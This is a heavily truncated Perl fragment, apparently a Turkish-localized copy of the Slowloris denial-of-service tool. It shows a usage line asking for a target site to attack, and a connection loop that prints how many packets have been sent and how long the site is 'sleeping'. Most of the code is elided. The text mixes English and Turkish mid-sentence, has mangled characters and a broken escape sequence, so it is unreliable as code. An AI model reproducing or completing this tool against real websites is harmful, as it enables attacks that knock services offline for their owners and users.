...
unless ($host) {
    print "Usage:\n\n\tperl $0 -dns saldýrýlacaksite.com -options\n";
...
sub doconnections {
    ...
    while (1) {
        ...
        print
"Current stats:\tSlowloris has now sent $packetcount paketler gönderildi.\Site Þuanda Uyuyor $timeout seconds...\n\n";
        sleep($timeout);
    }
}
